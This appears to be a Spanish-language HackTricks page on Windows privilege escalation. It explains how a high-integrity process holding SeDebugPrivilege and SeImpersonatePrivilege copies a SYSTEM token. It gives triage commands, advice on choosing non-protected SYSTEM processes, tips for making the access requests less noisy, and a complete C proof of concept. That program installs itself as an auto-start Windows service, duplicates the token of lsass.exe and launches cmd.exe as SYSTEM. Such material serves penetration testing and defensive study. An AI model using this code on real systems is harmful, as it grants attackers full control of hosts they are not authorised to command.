# SeDebug + SeImpersonate - Copy Token

{{#include ../../banners/hacktricks-training.md}}

Esta página cubre la variante de **robo manual de token** donde un contexto de **High Integrity** que ya tiene **`SeDebugPrivilege`** y **`SeImpersonatePrivilege`** abre un proceso **SYSTEM** مناسب, **duplica su token** y **lanza un nuevo proceso** con ese token.

Si solo necesitas un shell rápido de `SYSTEM` desde un proceso admin privilegiado, revisa también:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

Si **no** tienes una ruta de process-handle pero sí tienes **`SeImpersonatePrivilege`**, la ruta de **named-pipe / Potato** suele ser más fácil:

{{#ref}}
named-pipe-client-impersonation.md
{{#endref}}

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Quick triage

Antes de probar la ruta de copiar token, confirma que el proceso actual ya está en un contexto útil:
```cmd
whoami /groups | findstr /i "high mandatory"
whoami /priv | findstr /i "SeDebugPrivilege SeImpersonatePrivilege"
```
Notas:

- **`SeDebugPrivilege`** es lo que te permite abrir muchos procesos SYSTEM **no protegidos** incluso cuando su DACL normalmente te bloquearía.
- **`SeImpersonatePrivilege`** es lo que hace práctico **`CreateProcessWithTokenW`** después.
- Si la ruta de copia de token solo te da un token SYSTEM débil o filtrado, simplemente roba de un **proceso SYSTEM diferente**.

## Elige el proceso objetivo con cuidado

La técnica normalmente se muestra contra **`lsass.exe`**, pero en Windows moderno ese suele ser el **objetivo incorrecto**:

- Si **LSA Protection / RunAsPPL** está habilitado, **`lsass.exe`** está protegido y un proceso admin normal con `SeDebugPrivilege` seguirá sin poder abrirlo.
- Prefiere procesos SYSTEM **no-PPL** como **`winlogon.exe`**, **`wininit.exe`**, **`services.exe`** o una instancia temprana de **`svchost.exe`**.
- Los **procesos protegidos** y algunos procesos especiales como **`System`** o **`csrss.exe`** no son objetivos realistas en user-mode para esta técnica.
- Usa **Process Hacker / Process Explorer** ejecutados con privilegios elevados para verificar si el token del objetivo realmente tiene los privilegios que quieres antes de duplicarlo.

## Detalles de la API que importan en la práctica

Muchos PoCs públicos solicitan **`PROCESS_ALL_ACCESS`** y **`TOKEN_ALL_ACCESS`**, pero eso es más ruidoso de lo necesario. En la práctica:

- Abre el proceso objetivo solo con los permisos que necesites (normalmente **`PROCESS_QUERY_INFORMATION`** o **`PROCESS_QUERY_LIMITED_INFORMATION`**).
- Abre el token con los permisos necesarios para crear procesos: **`TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY`**.
- Usa **`DuplicateTokenEx(..., TokenPrimary, ...)`** para crear un **primary token**; un impersonation token por sí solo no basta para crear un nuevo proceso.
- Si **`CreateProcessWithTokenW`** falla con **`1314`**, cambia a **`CreateProcessAsUserW`**.
- Si ejecutas desde un **service / Session 0**, recuerda que **`CreateProcessWithTokenW`** mantiene al hijo en la **sesión del llamador**. Si necesitas una shell visible en el escritorio, usa **`CreateProcessAsUserW`** y mueve el token a la sesión deseada.

Un flujo moderno mínimo tiene este aspecto:
```c
HANDLE hp = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
HANDLE hTok = NULL, hDup = NULL;
OpenProcessToken(hp, TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, &hTok);
DuplicateTokenEx(hTok, MAXIMUM_ALLOWED, NULL,
SecurityImpersonation, TokenPrimary, &hDup);
CreateProcessWithTokenW(hDup, LOGON_WITH_PROFILE,
L"C:\\Windows\\System32\\cmd.exe",
NULL, 0, NULL, NULL, &si, &pi);
```
## Full service PoC

El siguiente código **explota los privilegios `SeDebugPrivilege` y `SeImpersonatePrivilege`** para copiar el token de un **process en ejecución como SYSTEM** y con **todos los token privileges**. En este caso, el código puede compilarse y usarse como un **Windows service binary** para verificar que la primitive funciona.

La parte principal del **code donde ocurre la elevación** está dentro de la función **`Exploit`**. Dentro de esa función puedes ver que se busca **`lsass.exe`**, se copia su **token**, y finalmente ese token se usa para iniciar un nuevo **`cmd.exe`** con todos los privileges del token copiado.

En hosts modernos, a menudo querrás reemplazar **`lsass.exe`** por otro **non-PPL SYSTEM process** como **`winlogon.exe`**, **`wininit.exe`** o **`services.exe`**.

Otros processes que se ejecutan como SYSTEM con todos o la mayoría de los token privileges son: **`services.exe`**, **`svchost.exe`** (algunos de los primeros), **`wininit.exe`**, **`csrss.exe`**... Recuerda que, por lo general, **no podrás copiar un token from un protected process**.
```c
// From https://cboard.cprogramming.com/windows-programming/106768-running-my-program-service.html
#include <windows.h>
#include <tlhelp32.h>
#include <tchar.h>
#pragma comment (lib, "advapi32")

TCHAR* serviceName = TEXT("TokenDanceSrv");
SERVICE_STATUS serviceStatus;
SERVICE_STATUS_HANDLE serviceStatusHandle = 0;
HANDLE stopServiceEvent = 0;

//This function will find the pid of a process by name
int FindTarget(const char *procname) {

HANDLE hProcSnap;
PROCESSENTRY32 pe32;
int pid = 0;

hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (INVALID_HANDLE_VALUE == hProcSnap) return 0;

pe32.dwSize = sizeof(PROCESSENTRY32);

if (!Process32First(hProcSnap, &pe32)) {
CloseHandle(hProcSnap);
return 0;
}

while (Process32Next(hProcSnap, &pe32)) {
if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
pid = pe32.th32ProcessID;
break;
}
}

CloseHandle(hProcSnap);

return pid;
}


int Exploit(void) {

HANDLE hSystemToken, hSystemProcess;
HANDLE dupSystemToken = NULL;
HANDLE hProcess, hThread;
STARTUPINFOA si;
PROCESS_INFORMATION pi;
int pid = 0;


ZeroMemory(&si, sizeof(si));
si.cb = sizeof(si);
ZeroMemory(&pi, sizeof(pi));

// open high privileged process
if ( pid = FindTarget("lsass.exe") )
hSystemProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
else
return -1;

// extract high privileged token
if (!OpenProcessToken(hSystemProcess, TOKEN_ALL_ACCESS, &hSystemToken)) {
CloseHandle(hSystemProcess);
return -1;
}

// make a copy of a token
DuplicateTokenEx(hSystemToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupSystemToken);

// and spawn a new process with higher privs
CreateProcessAsUserA(dupSystemToken, "C:\\windows\\system32\\cmd.exe",
NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

return 0;
}


void WINAPI ServiceControlHandler( DWORD controlCode ) {
switch ( controlCode ) {
case SERVICE_CONTROL_SHUTDOWN:
case SERVICE_CONTROL_STOP:
serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

SetEvent( stopServiceEvent );
return;

case SERVICE_CONTROL_PAUSE:
break;

case SERVICE_CONTROL_CONTINUE:
break;

case SERVICE_CONTROL_INTERROGATE:
break;

default:
break;
}
SetServiceStatus( serviceStatusHandle, &serviceStatus );
}

void WINAPI ServiceMain( DWORD argc, TCHAR* argv[] ) {
// initialise service status
serviceStatus.dwServiceType = SERVICE_WIN32;
serviceStatus.dwCurrentState = SERVICE_STOPPED;
serviceStatus.dwControlsAccepted = 0;
serviceStatus.dwWin32ExitCode = NO_ERROR;
serviceStatus.dwServiceSpecificExitCode = NO_ERROR;
serviceStatus.dwCheckPoint = 0;
serviceStatus.dwWaitHint = 0;

serviceStatusHandle = RegisterServiceCtrlHandler( serviceName, ServiceControlHandler );

if ( serviceStatusHandle ) {
// service is starting
serviceStatus.dwCurrentState = SERVICE_START_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

// do initialisation here
stopServiceEvent = CreateEvent( 0, FALSE, FALSE, 0 );

// running
serviceStatus.dwControlsAccepted |= (SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN);
serviceStatus.dwCurrentState = SERVICE_RUNNING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

Exploit();
WaitForSingleObject( stopServiceEvent, -1 );

// service was stopped
serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

// do cleanup here
CloseHandle( stopServiceEvent );
stopServiceEvent = 0;

// service is now stopped
serviceStatus.dwControlsAccepted &= ~(SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN);
serviceStatus.dwCurrentState = SERVICE_STOPPED;
SetServiceStatus( serviceStatusHandle, &serviceStatus );
}
}


void InstallService() {
SC_HANDLE serviceControlManager = OpenSCManager( 0, 0, SC_MANAGER_CREATE_SERVICE );

if ( serviceControlManager ) {
TCHAR path[ _MAX_PATH + 1 ];
if ( GetModuleFileName( 0, path, sizeof(path)/sizeof(path[0]) ) > 0 ) {
SC_HANDLE service = CreateService( serviceControlManager,
serviceName, serviceName,
SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
SERVICE_AUTO_START, SERVICE_ERROR_IGNORE, path,
0, 0, 0, 0, 0 );
if ( service )
CloseServiceHandle( service );
}
CloseServiceHandle( serviceControlManager );
}
}

void UninstallService() {
SC_HANDLE serviceControlManager = OpenSCManager( 0, 0, SC_MANAGER_CONNECT );

if ( serviceControlManager ) {
SC_HANDLE service = OpenService( serviceControlManager,
serviceName, SERVICE_QUERY_STATUS | DELETE );
if ( service ) {
SERVICE_STATUS serviceStatus;
if ( QueryServiceStatus( service, &serviceStatus ) ) {
if ( serviceStatus.dwCurrentState == SERVICE_STOPPED )
DeleteService( service );
}
CloseServiceHandle( service );
}
CloseServiceHandle( serviceControlManager );
}
}

int _tmain( int argc, TCHAR* argv[] )
{
if ( argc > 1 && lstrcmpi( argv[1], TEXT("install") ) == 0 ) {
InstallService();
}
else if ( argc > 1 && lstrcmpi( argv[1], TEXT("uninstall") ) == 0 ) {
UninstallService();
}
else  {
SERVICE_TABLE_ENTRY serviceTable[] = {
{ serviceName, ServiceMain },
{ 0, 0 }
};

StartServiceCtrlDispatcher( serviceTable );
}

return 0;
}
```
## References

- [CreateProcessWithTokenW function (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [Configure added LSA protection (Microsoft Learn)](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)
{{#include ../../banners/hacktricks-training.md}}
